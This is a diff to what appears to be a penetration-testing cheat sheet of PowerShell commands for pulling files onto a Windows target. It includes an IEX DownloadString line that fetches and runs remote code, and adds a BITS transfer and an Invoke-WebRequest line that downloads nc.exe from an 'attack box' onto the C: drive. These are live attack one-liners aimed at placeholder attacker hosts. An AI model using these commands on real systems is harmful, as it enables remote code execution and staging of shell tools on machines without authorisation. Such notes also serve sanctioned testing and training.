@@ -1,2 +1,11 @@
 # Powershell Fetch Remote File
 powershell "IEX(New-Object Net.WebClient).DownloadString('http://host:port/file')"
+
+# BITS Transfer
+# Uses idle bandwidth and does not affect bandwidth used by existing applications
+# Does not rely on IE
+powershell Import-Module BitsTransfer;Start-BitsTransfer -Source http://host:port/file -Destination C:\
+
+# WebRequest
+# Heavy memory and performance impact - LAST RESORT
+powershell Invoke-WebRequest -Uri http://[IP Attack box]/nc.exe -OutFile C:\nc.exe
